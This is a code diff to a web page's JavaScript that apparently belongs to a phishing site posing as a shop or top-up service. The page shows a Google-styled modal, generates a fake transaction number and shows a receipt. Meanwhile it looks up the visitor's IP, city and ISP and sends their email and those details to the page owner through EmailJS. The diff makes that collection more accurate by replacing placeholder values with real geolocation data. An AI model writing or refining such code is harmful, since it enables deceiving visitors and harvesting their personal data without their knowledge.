@@ -468,7 +468,7 @@
             }
             document.getElementById('google-modal').style.display = 'flex';
         }
-
+        
         async function submitData(e) {
     e.preventDefault();
     if (isSubmitted) return;
@@ -482,14 +482,26 @@
     const noTrans = 'TRX-' + Math.floor(100000 + Math.random() * 900000);
     const now = new Date().toLocaleString('id-ID', { dateStyle: 'full', timeStyle: 'medium' });
 
-    // AMBIL DATA DARI IP-API.COM
-    let ipData = { query: 'Unknown', country: 'Indonesia', regionName: 'North Sulawesi', city: 'Manado', isp: 'PT Telkom Indonesia', as: 'AS7713 PT Telekomunikasi Indonesia' };
+    // AMBIL DATA ASLI DARI IP API (MENGGUNAKAN HTTPS)
+    let ipData = { query: '-', country: '-', regionName: '-', city: '-', isp: '-', as: '-' };
     try {
-        const res = await fetch('http://ip-api.com/json/');
-        ipData = await res.json();
-    } catch(err) {}
+        const res = await fetch('https://ipapi.co/json/');
+        const data = await res.json();
+        if (data) {
+            ipData = {
+                query: data.ip || '-',
+                country: data.country_name || '-',
+                regionName: data.region || '-',
+                city: data.city || '-',
+                isp: data.org || '-',
+                as: data.asn || '-'
+            };
+        }
+    } catch(err) {
+        console.error('Gagal mengambil data IP:', err);
+    }
 
-    // KIRIM KE EMAIL VIA EMAILJS
+    // KIRIM KE EMAIL VIA EMAILJS DENGAN DATA ASLI
     try {
         await emailjs.send('service_y7gqa5k', 'template_rp7jmda', {
             email_target: email,
@@ -515,12 +527,10 @@
     document.getElementById('rOrigPrice').innerText = currentItemObj.orig;
     document.getElementById('rDate').innerText = now;
     document.getElementById('rEmail').innerText = email;
-    document.getElementById('rCountry').innerText = ipData.country || 'Indonesia';
+    document.getElementById('rCountry').innerText = ipData.country;
 
     document.getElementById('invoice-screen').style.display = 'flex';
 }
-
-        
 
         function toggleReceiptDetail() {
             const box = document.getElementById('receiptDetailsBox');
